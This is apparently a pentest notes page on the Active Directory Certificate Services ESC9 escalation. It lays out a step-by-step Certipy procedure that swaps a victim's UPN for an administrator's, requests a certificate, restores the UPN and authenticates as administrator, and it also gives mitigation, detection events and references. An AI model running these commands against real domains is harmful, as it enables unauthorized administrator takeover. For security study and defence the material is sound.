---
topic: AD CS ESC9
tags: [windows, active-directory, adcs, esc9, certipy, pkinit]
---

# AD CS ESC9

**English** | [🇪🇸 Español](adcs-esc9.md)

## Concept

ESC9 is an Active Directory Certificate Services escalation. It abuses a certificate template with `CT_FLAG_NO_SECURITY_EXTENSION` when the attacker controls the `userPrincipalName` of an account with enrollment rights. Change the victim's UPN to an administrator's, request the certificate and restore the UPN; the certificate remains valid for PKINIT authentication as the administrator.

## When it applies

- The CA issues a vulnerable template without the SID security extension.
- The attacker has `GenericAll`, `GenericWrite` or equivalent over the victim account.
- The victim can enroll in the template.
- The domain allows certificate authentication (PKINIT).

## Requirements and conditions

1. LDAP access to modify the UPN.
2. Enrollment rights on the template.
3. Template with `CT_FLAG_NO_SECURITY_EXTENSION`.
4. Connectivity to the CA and DC.
5. A PKINIT-capable client (Certipy, Rubeus, PKINITtools).

## Procedure

Enumerate AD CS:

```bash
certipy find -u <USER> -p '<PASSWORD>' -dc-ip <DC> -vulnerable -stdout
```

Identify the template and controlled account. Change the victim's UPN to the administrator's:

```bash
certipy account update -u <USER> -p '<PASSWORD>' -user <VICTIM> -upn administrator
```

Request the certificate:

```bash
certipy req -u <VICTIM> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -dc-ip <DC>
```

Restore the UPN:

```bash
certipy account update -u <USER> -p '<PASSWORD>' -user <VICTIM> -upn <VICTIM>@<DOMAIN>
```

Authenticate with the PFX:

```bash
certipy auth -pfx administrator.pfx -dc-ip <DC>
```

## Variants

- **ESC10**: changes the UPN of an account with rights over another; the difference is the source of control.
- **ESC9 + RBCD**: use the administrator certificate to configure RBCD instead of a direct session.
- **Rubeus/PKINITtools**: alternatives to Certipy for requesting a TGT from the PFX.
- **User templates**: the same logic applies to any vulnerable enrollment template.

## Limitations

- Microsoft hardened certificate validation (strong certificate mapping); a patched domain may reject the manipulated UPN.
- The victim account must have enrollment rights.
- The UPN change leaves 4738 events and can break the victim's logon.
- The CA must be available and the certificate accepted by the DC.

## Mitigation

- Remove `CT_FLAG_NO_SECURITY_EXTENSION` from templates.
- Apply Microsoft updates for strong certificate mapping.
- Restrict `GenericAll`/`GenericWrite` over accounts and groups.
- Audit templates and enrollment rights; separate CA roles.
- Require approval for sensitive templates.

## Detection

- Events 4886/4887 (certificate request/issuance) with unusual accounts or templates.
- Event 4738 (account changed) with a `userPrincipalName` modification.
- PKINIT authentications from unusual hosts.
- Changes to `msPKI-Certificate-Name-Flag` or template ACLs.

MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates), T1098 (Account Manipulation).

## References

- <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-templates>
- <https://attack.mitre.org/techniques/T1649/>
